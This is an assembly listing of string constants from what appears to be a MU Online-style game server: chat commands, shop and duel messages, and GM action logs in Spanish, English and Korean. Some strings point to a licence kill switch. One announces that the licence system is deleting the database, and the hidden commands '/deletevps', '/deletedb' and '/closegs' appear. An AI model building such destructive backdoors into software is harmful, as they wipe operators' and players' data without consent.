CONST	ENDS
;	COMDAT ??_C@_0BL@DPKIEIPO@Error?5de?5licencia?5Aviso?5?$CD2@
CONST	SEGMENT
??_C@_0BL@DPKIEIPO@Error?5de?5licencia?5Aviso?5?$CD2@ DB 'Error de licenc'
	DB	'ia Aviso #2', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0EO@DKMCALC@GAMESERVER?5LICENCIA?3?5El?5sistema@
CONST	SEGMENT
??_C@_0EO@DKMCALC@GAMESERVER?5LICENCIA?3?5El?5sistema@ DB 'GAMESERVER LIC'
	DB	'ENCIA: El sistema de licencia esta eliminando la Base De Dato'
	DB	's ', 00H					; `string'
CONST	ENDS
;	COMDAT ??_C@_0BL@BEIFBLDN@Error?5de?5licencia?5Aviso?5?$CD1@
CONST	SEGMENT
??_C@_0BL@BEIFBLDN@Error?5de?5licencia?5Aviso?5?$CD1@ DB 'Error de licenc'
	DB	'ia Aviso #1', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0EF@OLKIGBOO@GAMESERVER?5LICENCIA?3?5aviso?5no?5e@
CONST	SEGMENT
??_C@_0EF@OLKIGBOO@GAMESERVER?5LICENCIA?3?5aviso?5no?5e@ DB 'GAMESERVER L'
	DB	'ICENCIA: aviso no estas autorizado para usar estos files', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BG@GFGDFAFL@?$FLBOTSTORE?$FN?3?5?$CFs?5Activo@
CONST	SEGMENT
??_C@_0BG@GFGDFAFL@?$FLBOTSTORE?$FN?3?5?$CFs?5Activo@ DB '[BOTSTORE]: %s '
	DB	'Activo', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0CF@EFAGGJG@?$FLTIENDA?5CASH?$FN?3?5?$CFs?5Activo?5?9?$DO?5?1of@
CONST	SEGMENT
??_C@_0CF@EFAGGJG@?$FLTIENDA?5CASH?$FN?3?5?$CFs?5Activo?5?9?$DO?5?1of@ DB '['
	DB	'TIENDA CASH]: %s Activo -> /offcash', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0EJ@ILIKMIPK@?$FLAtaque?5Automatico?$FN?3?5?$CFs?5Activo?5@
CONST	SEGMENT
??_C@_0EJ@ILIKMIPK@?$FLAtaque?5Automatico?$FN?3?5?$CFs?5Activo?5@ DB '[At'
	DB	'aque Automatico]: %s Activo -> /attackoff - quedo modo dejo d'
	DB	'e attack', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0EA@FCMKAJKK@?$FLAtaque?5Automatico?$FN?3?5?$CFs?5Activo?5@
CONST	SEGMENT
??_C@_0EA@FCMKAJKK@?$FLAtaque?5Automatico?$FN?3?5?$CFs?5Activo?5@ DB '[At'
	DB	'aque Automatico]: %s Activo -> /attackon - quedo modo attack', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0CH@LIDNEDCM@?$FLDuelInfo?$FN?5DuelWins?3?5?$CFd?0?5DuelLo@
CONST	SEGMENT
??_C@_0CH@LIDNEDCM@?$FLDuelInfo?$FN?5DuelWins?3?5?$CFd?0?5DuelLo@ DB '[Du'
	DB	'elInfo] DuelWins: %d, DuelLoser: %d', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0CD@GMONJFFH@?$FLTIENDA?5ZEN?$FN?3?5?$CFs?5Activo?5?9?$DO?5?1off@
CONST	SEGMENT
??_C@_0CD@GMONJFFH@?$FLTIENDA?5ZEN?$FN?3?5?$CFs?5Activo?5?9?$DO?5?1off@ DB '['
	DB	'TIENDA ZEN]: %s Activo -> /offzen', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BJ@CLNEGGOG@Action?3?5Ban?5User?$FL?$CFs?$FN?$FL?$CFs?$FN@
CONST	SEGMENT
??_C@_0BJ@CLNEGGOG@Action?3?5Ban?5User?$FL?$CFs?$FN?$FL?$CFs?$FN@ DB 'Act'
	DB	'ion: Ban User[%s][%s]', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0BL@CFOGCENH@Te?5falta?5dinero?0?5Costo?3?5?$CFd@
CONST	SEGMENT
??_C@_0BL@CFOGCENH@Te?5falta?5dinero?0?5Costo?3?5?$CFd@ DB 'Te falta dine'
	DB	'ro, Costo: %d', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0L@EIAKHCAN@Tiempo?3?5?$CFs@
CONST	SEGMENT
??_C@_0L@EIAKHCAN@Tiempo?3?5?$CFs@ DB 'Tiempo: %s', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_08OAHPJFNN@?$CFH?3?$CFM?3?$CFS@
CONST	SEGMENT
??_C@_08OAHPJFNN@?$CFH?3?$CFM?3?$CFS@ DB '%H:%M:%S', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BH@OMKDAPPO@Usuarios?5Online?3?5?$CFd?1?$CFd@
CONST	SEGMENT
??_C@_0BH@OMKDAPPO@Usuarios?5Online?3?5?$CFd?1?$CFd@ DB 'Usuarios Online:'
	DB	' %d/%d', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0FF@DOGCJMIO@Command?5Make?5Usage?3?5?1make?5Type?5@
CONST	SEGMENT
??_C@_0FF@DOGCJMIO@Command?5Make?5Usage?3?5?1make?5Type?5@ DB 'Command Ma'
	DB	'ke Usage: /make Type Index Level IsSkill IsLuck Option ExcOpt'
	DB	'ion SetOption', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0DK@FACDLFDK@?G?X?$LE?g?5?A?v?$LP?$KK?$MA?$LI?$LH?N?5?G?v?$MA?g?5?A?B?G?$KF?$MA?L?$LF?$LP?5?G?R?5@
CONST	SEGMENT
??_C@_0DK@FACDLFDK@?G?X?$LE?g?5?A?v?$LP?$KK?$MA?$LI?$LH?N?5?G?v?$MA?g?5?A?B?G?$KF?$MA?L?$LF?$LP?5?G?R?5@ DB 0c7H
	DB	0d8H, 0b4H, 0e7H, ' ', 0c1H, 0f6H, 0bfH, 0aaH, 0c0H, 0b8H, 0b7H
	DB	0ceH, ' ', 0c7H, 0f6H, 0c0H, 0e7H, ' ', 0c1H, 0c2H, 0c7H, 0a5H
	DB	0c0H, 0ccH, 0b5H, 0bfH, ' ', 0c7H, 0d2H, ' ', 0bcH, 0f6H, ' ', 0beH
	DB	0f8H, 0bdH, 0c0H, 0b4H, 0cfH, 0b4H, 0d9H, '. (', 0bcH, 0d3H, 0bcH
	DB	0baH, 0c4H, 0daH, 0b5H, 0e5H, ':%d)', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_09IHCLJBNP@?1?$LN?$LK?E?H?$LI?$KO?$LM?B@
CONST	SEGMENT
??_C@_09IHCLJBNP@?1?$LN?$LK?E?H?$LI?$KO?$LM?B@ DB '/', 0bdH, 0baH, 0c5H, 0c8H
	DB	0b8H, 0aeH, 0bcH, 0c2H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0CP@INODGHGL@?D?$LD?$LI?$KP?E?M?5?A?$KE?$LK?$LI?$LA?$KB?5?$LI?$KO?$LM?B?$LF?G?$LO?z?$LN?$MA?$LE?O?$LE?Y?4?5?$LL@
CONST	SEGMENT
??_C@_0CP@INODGHGL@?D?$LD?$LI?$KP?E?M?5?A?$KE?$LK?$LI?$LA?$KB?5?$LI?$KO?$LM?B?$LF?G?$LO?z?$LN?$MA?$LE?O?$LE?Y?4?5?$LL@ DB 0c4H
	DB	0b3H, 0b8H, 0afH, 0c5H, 0cdH, ' ', 0c1H, 0a4H, 0baH, 0b8H, 0b0H
	DB	0a1H, ' ', 0b8H, 0aeH, 0bcH, 0c2H, 0b5H, 0c7H, 0beH, 0faH, 0bdH
	DB	0c0H, 0b4H, 0cfH, 0b4H, 0d9H, '. ', 0bbH, 0f5H, 0b7H, 0ceH, ' '
	DB	0bfH, 0acH, 0b0H, 0e1H, ' ', 0c7H, 0cfH, 0bcH, 0bcH, 0bfH, 0e4H
	DB	00H						; `string'
CONST	ENDS
;	COMDAT ??_C@_0BD@ONJMFEJN@?D?o?$LF?PHP?H?$LI?$LK?$LJ?$LN?C?$LA?$KD?$LM?$LD?A?$KE@
CONST	SEGMENT
??_C@_0BD@ONJMFEJN@?D?o?$LF?PHP?H?$LI?$LK?$LJ?$LN?C?$LA?$KD?$LM?$LD?A?$KE@ DB 0c4H
	DB	0efH, 0b5H, 0d0H, 'HP', 0c8H, 0b8H, 0baH, 0b9H, 0bdH, 0c3H, 0b0H
	DB	0a3H, 0bcH, 0b3H, 0c1H, 0a4H, 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0BF@IAPMHEEM@?D?o?$LF?PHP?C?J?$LE?g?H?$LI?$LK?$LJ?$LH?$KO?$LM?$LD?A?$KE@
CONST	SEGMENT
??_C@_0BF@IAPMHEEM@?D?o?$LF?PHP?C?J?$LE?g?H?$LI?$LK?$LJ?$LH?$KO?$LM?$LD?A?$KE@ DB 0c4H
	DB	0efH, 0b5H, 0d0H, 'HP', 0c3H, 0caH, 0b4H, 0e7H, 0c8H, 0b8H, 0baH
	DB	0b9H, 0b7H, 0aeH, 0bcH, 0b3H, 0c1H, 0a4H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BB@FDCEFCLA@?D?o?$LF?PHP?H?$LI?$LK?$LJ?$LH?$KO?$LM?$LD?A?$KE@
CONST	SEGMENT
??_C@_0BB@FDCEFCLA@?D?o?$LF?PHP?H?$LI?$LK?$LJ?$LH?$KO?$LM?$LD?A?$KE@ DB 0c4H
	DB	0efH, 0b5H, 0d0H, 'HP', 0c8H, 0b8H, 0baH, 0b9H, 0b7H, 0aeH, 0bcH
	DB	0b3H, 0c1H, 0a4H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0L@LMJDAGMB@?D?o?$LF?PHP?$LM?$LD?A?$KE@
CONST	SEGMENT
??_C@_0L@LMJDAGMB@?D?o?$LF?PHP?$LM?$LD?A?$KE@ DB 0c4H, 0efH, 0b5H, 0d0H, 'H'
	DB	'P', 0bcH, 0b3H, 0c1H, 0a4H, 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0DC@DLDEMFJO@?D?o?$LF?P?5HP?5?C?J?$LE?g?H?$LI?$LK?$LJ?$LH?$KO?5?$DN?5?$CFd?5?H?$LI?$LK?$LJ?$LH?$KO?5@
CONST	SEGMENT
??_C@_0DC@DLDEMFJO@?D?o?$LF?P?5HP?5?C?J?$LE?g?H?$LI?$LK?$LJ?$LH?$KO?5?$DN?5?$CFd?5?H?$LI?$LK?$LJ?$LH?$KO?5@ DB 0c4H
	DB	0efH, 0b5H, 0d0H, ' HP ', 0c3H, 0caH, 0b4H, 0e7H, 0c8H, 0b8H, 0baH
	DB	0b9H, 0b7H, 0aeH, ' = %d ', 0c8H, 0b8H, 0baH, 0b9H, 0b7H, 0aeH
	DB	' = %d ', 0c8H, 0b8H, 0baH, 0b9H, 0bdH, 0c3H, 0b0H, 0a3H, ' = '
	DB	'%d', 00H					; `string'
CONST	ENDS
;	COMDAT ??_C@_0BI@FABGHCEJ@?D?o?$LF?P?5HP?5?$DN?5?$CF7?40f?5?1?5?$CF7?40f@
CONST	SEGMENT
??_C@_0BI@FABGHCEJ@?D?o?$LF?P?5HP?5?$DN?5?$CF7?40f?5?1?5?$CF7?40f@ DB 0c4H
	DB	0efH, 0b5H, 0d0H, ' HP = %7.0f / %7.0f', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0DF@GLPGGMOI@?$FLKUNDUN?$FN?5Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs@
CONST	SEGMENT
??_C@_0DF@GLPGGMOI@?$FLKUNDUN?$FN?5Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs@ DB '['
	DB	'KUNDUN] Use GM Command -> [ %s ]', 09H, '[ %s ]', 09H, '[ %s '
	DB	'] : %s', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0N@DFKMJHLF@?D?o?$LF?P?$LL?s?E?B?$LK?$LI?$LB?b@
CONST	SEGMENT
??_C@_0N@DFKMJHLF@?D?o?$LF?P?$LL?s?E?B?$LK?$LI?$LB?b@ DB 0c4H, 0efH, 0b5H
	DB	0d0H, 0bbH, 0f3H, 0c5H, 0c2H, 0baH, 0b8H, 0b1H, 0e2H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_03MCADLMAF@off@
CONST	SEGMENT
??_C@_03MCADLMAF@off@ DB 'off', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_02LIELOMNJ@on@
CONST	SEGMENT
??_C@_02LIELOMNJ@on@ DB 'on', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0N@KELDLAKD@Set?5GuildWar@
CONST	SEGMENT
??_C@_0N@KELDLAKD@Set?5GuildWar@ DB 'Set GuildWar', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BC@MOJFCJJN@Free?5Ban?9Chatting@
CONST	SEGMENT
??_C@_0BC@MOJFCJJN@Free?5Ban?9Chatting@ DB 'Free Ban-Chatting', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0N@KILIGKJC@Ban?5Chatting@
CONST	SEGMENT
??_C@_0N@KILIGKJC@Ban?5Chatting@ DB 'Ban Chatting', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0N@GPDFKJGB@End?5GuildWar@
CONST	SEGMENT
??_C@_0N@GPDFKJGB@End?5GuildWar@ DB 'End GuildWar', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BC@DPMLLFMM@Stop?5BattleSoccer@
CONST	SEGMENT
??_C@_0BC@DPMLLFMM@Stop?5BattleSoccer@ DB 'Stop BattleSoccer', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BD@EFECDMGE@Start?5BattleSoccer@
CONST	SEGMENT
??_C@_0BD@EFECDMGE@Start?5BattleSoccer@ DB 'Start BattleSoccer', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BC@HIAMIIED@Guild?5SetPosition@
CONST	SEGMENT
??_C@_0BC@HIAMIIED@Guild?5SetPosition@ DB 'Guild SetPosition', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BB@FJGOBKEK@User?5SetPosition@
CONST	SEGMENT
??_C@_0BB@FJGOBKEK@User?5SetPosition@ DB 'User SetPosition', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BB@BCPFBGGF@Guild?5Disconnect@
CONST	SEGMENT
??_C@_0BB@BCPFBGGF@Guild?5Disconnect@ DB 'Guild Disconnect', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BA@MEJDKKFB@User?5Disconnect@
CONST	SEGMENT
??_C@_0BA@MEJDKKFB@User?5Disconnect@ DB 'User Disconnect', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0CM@FGOOHLMI@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@
CONST	SEGMENT
??_C@_0CM@FGOOHLMI@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@ DB 'U'
	DB	'se GM Command -> [ %s ]', 09H, '[ %s ]', 09H, '[ %s ] : %s', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BH@NPPBDIDN@User?5Stat?5?$CIconnection?$CJ@
CONST	SEGMENT
??_C@_0BH@NPPBDIDN@User?5Stat?5?$CIconnection?$CJ@ DB 'User Stat (connect'
	DB	'ion)', 00H					; `string'
CONST	ENDS
;	COMDAT ??_C@_0EA@DPOHDNID@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@
CONST	SEGMENT
??_C@_0EA@DPOHDNID@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@ DB 'U'
	DB	'se GM Command -> [ %s ]', 09H, '[ %s ]', 09H, '[ %s ] / Targe'
	DB	't : [%s][%s] : %s', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0O@HBGDJJNF@User?5Tracking@
CONST	SEGMENT
??_C@_0O@HBGDJJNF@User?5Tracking@ DB 'User Tracking', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0O@GFMKDCHA@?$CFs?5?3?5?$LA?$KI?$LN?C?$LN?C?$MA?$NL@
CONST	SEGMENT
??_C@_0O@GFMKDCHA@?$CFs?5?3?5?$LA?$KI?$LN?C?$LN?C?$MA?$NL@ DB '%s : ', 0b0H
	DB	0a8H, 0bdH, 0c3H, 0bdH, 0c3H, 0c0H, 0dbH, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0O@MKODHHAM@?$CFs?5?3?5?$LA?$KI?$LN?C?G?X?A?$KG@
CONST	SEGMENT
??_C@_0O@MKODHHAM@?$CFs?5?3?5?$LA?$KI?$LN?C?G?X?A?$KG@ DB '%s : ', 0b0H, 0a8H
	DB	0bdH, 0c3H, 0c7H, 0d8H, 0c1H, 0a6H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0EB@OBAKBBAF@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@
CONST	SEGMENT
??_C@_0EB@OBAKBBAF@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@ DB 'U'
	DB	'se GM Command -> [ %s ]', 09H, '[ %s ]', 09H, '[ %s ] / Targe'
	DB	't : [%s][%s] : %s ', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0O@MIJMFKGB@User?5Watching@
CONST	SEGMENT
??_C@_0O@MIJMFKGB@User?5Watching@ DB 'User Watching', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_07BKDMMMJL@?$MA?$PM?A?w?4?4?4@
CONST	SEGMENT
??_C@_07BKDMMMJL@?$MA?$PM?A?w?4?4?4@ DB 0c0H, 0fcH, 0c1H, 0f7H, '...', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BD@EIKIGGHM@Modi?4Stat?5Complete@
CONST	SEGMENT
??_C@_0BD@EIKIGGHM@Modi?4Stat?5Complete@ DB 'Modi.Stat Complete', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0CB@IKIHDOJD@?$MA?$LI?H?e?H?e?5?D?$LD?$LI?$KP?E?M?5?$LN?$LK?E?H?5?$MA?g?$LM?$LD?A?$KE?5?$LP?O?$LH?a?$CB@
CONST	SEGMENT
??_C@_0CB@IKIHDOJD@?$MA?$LI?H?e?H?e?5?D?$LD?$LI?$KP?E?M?5?$LN?$LK?E?H?5?$MA?g?$LM?$LD?A?$KE?5?$LP?O?$LH?a?$CB@ DB 0c0H
	DB	0b8H, 0c8H, 0e5H, 0c8H, 0e5H, ' ', 0c4H, 0b3H, 0b8H, 0afH, 0c5H
	DB	0cdH, ' ', 0bdH, 0baH, 0c5H, 0c8H, ' ', 0c0H, 0e7H, 0bcH, 0b3H
	DB	0c1H, 0a4H, ' ', 0bfH, 0cfH, 0b7H, 0e1H, '!!', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0CD@MKLNLHDL@?$LN?$LK?E?H?5?$LM?$LD?A?$KE?$MA?L?5?$MA?$NP?$LI?x?5?$LF?F?$LN?$MA?$LE?O?$LE?Y?4?$CI?G?U?C?J@
CONST	SEGMENT
??_C@_0CD@MKLNLHDL@?$LN?$LK?E?H?5?$LM?$LD?A?$KE?$MA?L?5?$MA?$NP?$LI?x?5?$LF?F?$LN?$MA?$LE?O?$LE?Y?4?$CI?G?U?C?J@ DB 0bdH
	DB	0baH, 0c5H, 0c8H, ' ', 0bcH, 0b3H, 0c1H, 0a4H, 0c0H, 0ccH, ' ', 0c0H
	DB	0dfH, 0b8H, 0f8H, ' ', 0b5H, 0c6H, 0bdH, 0c0H, 0b4H, 0cfH, 0b4H
	DB	0d9H, '.(', 0c7H, 0d5H, 0c3H, 0caH, 0b0H, 0faH, ')', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0CH@KPNIMDDJ@?$LN?$LK?E?H?5?$LM?$LD?A?$KE?$MA?L?5?$MA?$NP?$LI?x?5?$LF?F?$LN?$MA?$LE?O?$LE?Y?4?$CI?$LB?b?$LK?$LL@
CONST	SEGMENT
??_C@_0CH@KPNIMDDJ@?$LN?$LK?E?H?5?$LM?$LD?A?$KE?$MA?L?5?$MA?$NP?$LI?x?5?$LF?F?$LN?$MA?$LE?O?$LE?Y?4?$CI?$LB?b?$LK?$LL@ DB 0bdH
	DB	0baH, 0c5H, 0c8H, ' ', 0bcH, 0b3H, 0c1H, 0a4H, 0c0H, 0ccH, ' ', 0c0H
	DB	0dfH, 0b8H, 0f8H, ' ', 0b5H, 0c6H, 0bdH, 0c0H, 0b4H, 0cfH, 0b4H
	DB	0d9H, '.(', 0b1H, 0e2H, 0baH, 0bbH, 0b0H, 0aaH, 0b9H, 0ccH, 0b8H
	DB	0b8H, ')', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0BD@KEDKPOLC@?$LO?K?$LM?v?5?$LO?x?$LE?B?5?$LO?F?$MA?L?E?$NL?4?4@
CONST	SEGMENT
??_C@_0BD@KEDKPOLC@?$LO?K?$LM?v?5?$LO?x?$LE?B?5?$LO?F?$MA?L?E?$NL?4?4@ DB 0beH
	DB	0cbH, 0bcH, 0f6H, ' ', 0beH, 0f8H, 0b4H, 0c2H, ' ', 0beH, 0c6H
	DB	0c0H, 0ccH, 0c5H, 0dbH, '..', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0CB@CPEOIFGE@?$FL?5?$CFs?5?$FN?5?$MA?G?5?$LO?F?$MA?L?E?$NL?5?$MA?N?$LF?$KG?$LN?$LK?5?$DN?5?$CFd?0?5?$CF@
CONST	SEGMENT
??_C@_0CB@CPEOIFGE@?$FL?5?$CFs?5?$FN?5?$MA?G?5?$LO?F?$MA?L?E?$NL?5?$MA?N?$LF?$KG?$LN?$LK?5?$DN?5?$CFd?0?5?$CF@ DB '['
	DB	' %s ] ', 0c0H, 0c7H, ' ', 0beH, 0c6H, 0c0H, 0ccH, 0c5H, 0dbH, ' '
	DB	0c0H, 0ceH, 0b5H, 0a6H, 0bdH, 0baH, ' = %d, %d', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BI@CHDHMMGL@PK?$LL?s?E?B?$LI?$KG?5?C?J?$LB?b?H?$KN?5?G?U?$LE?O?$LE?Y?4@
CONST	SEGMENT
??_C@_0BI@CHDHMMGL@PK?$LL?s?E?B?$LI?$KG?5?C?J?$LB?b?H?$KN?5?G?U?$LE?O?$LE?Y?4@ DB 'P'
	DB	'K', 0bbH, 0f3H, 0c5H, 0c2H, 0b8H, 0a6H, ' ', 0c3H, 0caH, 0b1H
	DB	0e2H, 0c8H, 0adH, ' ', 0c7H, 0d5H, 0b4H, 0cfH, 0b4H, 0d9H, '.', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_01CLKCMJKC@?5@
CONST	SEGMENT
??_C@_01CLKCMJKC@?5@ DB ' ', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0L@MOPIIJJK@?1deletevps@
CONST	SEGMENT
??_C@_0L@MOPIIJJK@?1deletevps@ DB '/deletevps', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_09DHDHCCDM@?1deletedb@
CONST	SEGMENT
??_C@_09DHDHCCDM@?1deletedb@ DB '/deletedb', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_08FEGOPANL@?1closegs@
CONST	SEGMENT
??_C@_08FEGOPANL@?1closegs@ DB '/closegs', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_08BHGJMCCG@?1botshop@
CONST	SEGMENT
??_C@_08BHGJMCCG@?1botshop@ DB '/botshop', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0N@JOEFOOKK@?1offsellcash@
CONST	SEGMENT
??_C@_0N@JOEFOOKK@?1offsellcash@ DB '/offsellcash', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_09EAHJBN@?1duelinfo@
CONST	SEGMENT
??_C@_09EAHJBN@?1duelinfo@ DB '/duelinfo', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0P@EMIDPKEE@?1autoattackoff@
CONST	SEGMENT
??_C@_0P@EMIDPKEE@?1autoattackoff@ DB '/autoattackoff', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0O@IGOCFEEE@?1autoattackon@
CONST	SEGMENT
??_C@_0O@IGOCFEEE@?1autoattackon@ DB '/autoattackon', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_09DIPPLEHO@?1offlevel@
CONST	SEGMENT
??_C@_09DIPPLEHO@?1offlevel@ DB '/offlevel', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_09BLALOGBO@?1offmoney@
CONST	SEGMENT
??_C@_09BLALOGBO@?1offmoney@ DB '/offmoney', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_07EGGDJHFC@?1offafk@
CONST	SEGMENT
??_C@_07EGGDJHFC@?1offafk@ DB '/offafk', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_04FJAIGIIB@?1ban@
CONST	SEGMENT
??_C@_04FJAIGIIB@?1ban@ DB '/ban', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_05KHGEPAAH@?1fire@
CONST	SEGMENT
??_C@_05KHGEPAAH@?1fire@ DB '/fire', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_02FDNBMIAB@?1w@
CONST	SEGMENT
??_C@_02FDNBMIAB@?1w@ DB '/w', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_02FILGPIH@?1q@
CONST	SEGMENT
??_C@_02FILGPIH@?1q@ DB '/q', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_08NKGJGPDF@?1vipinfo@
CONST	SEGMENT
??_C@_08NKGJGPDF@?1vipinfo@ DB '/vipinfo', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_06DAJLIHEI@?1reset@
CONST	SEGMENT
??_C@_06DAJLIHEI@?1reset@ DB '/reset', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_08GFOOHMGK@?1joinpvp@
CONST	SEGMENT
??_C@_08GFOOHMGK@?1joinpvp@ DB '/joinpvp', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_04MAAHHBCN@?1com@
CONST	SEGMENT
??_C@_04MAAHHBCN@?1com@ DB '/com', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_04CMHHMOMO@?1ene@
CONST	SEGMENT
??_C@_04CMHHMOMO@?1ene@ DB '/ene', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_04DIENADCK@?1vit@
CONST	SEGMENT
??_C@_04DIENADCK@?1vit@ DB '/vit', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_04GHPCCKFG@?1dex@
CONST	SEGMENT
??_C@_04GHPCCKFG@?1dex@ DB '/dex', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_04ENDHGELN@?1str@
CONST	SEGMENT
??_C@_04ENDHGELN@?1str@ DB '/str', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_07LFKEFJEH@?1online@
CONST	SEGMENT
??_C@_07LFKEFJEH@?1online@ DB '/online', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_08OLBJHFEG@?1pkclear@
CONST	SEGMENT
??_C@_08OLBJHFEG@?1pkclear@ DB '/pkclear', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_05KKDONAKI@?1time@
CONST	SEGMENT
??_C@_05KKDONAKI@?1time@ DB '/time', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0O@FADBPHEL@?1?D?o?$LF?P?H?$LI?$LK?$LJ?$LN?C?$LA?$KD@
CONST	SEGMENT
??_C@_0O@FADBPHEL@?1?D?o?$LF?P?H?$LI?$LK?$LJ?$LN?C?$LA?$KD@ DB '/', 0c4H, 0efH
	DB	0b5H, 0d0H, 0c8H, 0b8H, 0baH, 0b9H, 0bdH, 0c3H, 0b0H, 0a3H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BA@DDJDJNOB@?1?D?o?$LF?P?C?J?$LE?g?H?$LI?$LK?$LJ?$LH?$KO@
CONST	SEGMENT
??_C@_0BA@DDJDJNOB@?1?D?o?$LF?P?C?J?$LE?g?H?$LI?$LK?$LJ?$LH?$KO@ DB '/', 0c4H
	DB	0efH, 0b5H, 0d0H, 0c3H, 0caH, 0b4H, 0e7H, 0c8H, 0b8H, 0baH, 0b9H
	DB	0b7H, 0aeH, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0M@POALKPHK@?1?D?o?$LF?P?H?$LI?$LK?$LJ?$LH?$KO@
CONST	SEGMENT
??_C@_0M@POALKPHK@?1?D?o?$LF?P?H?$LI?$LK?$LJ?$LH?$KO@ DB '/', 0c4H, 0efH, 0b5H
	DB	0d0H, 0c8H, 0b8H, 0baH, 0b9H, 0b7H, 0aeH, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_07ILODLNBC@?1?D?o?$LF?P?G?G@
CONST	SEGMENT
??_C@_07ILODLNBC@?1?D?o?$LF?P?G?G@ DB '/', 0c4H, 0efH, 0b5H, 0d0H, 0c7H, 0c7H
	DB	00H						; `string'
CONST	ENDS
;	COMDAT ??_C@_09OAOHLHFO@?1?D?o?$LF?P?$LL?s?E?B@
CONST	SEGMENT
??_C@_09OAOHLHFO@?1?D?o?$LF?P?$LL?s?E?B@ DB '/', 0c4H, 0efH, 0b5H, 0d0H, 0bbH
	DB	0f3H, 0c5H, 0c2H, 00H			; `string'
CONST	ENDS
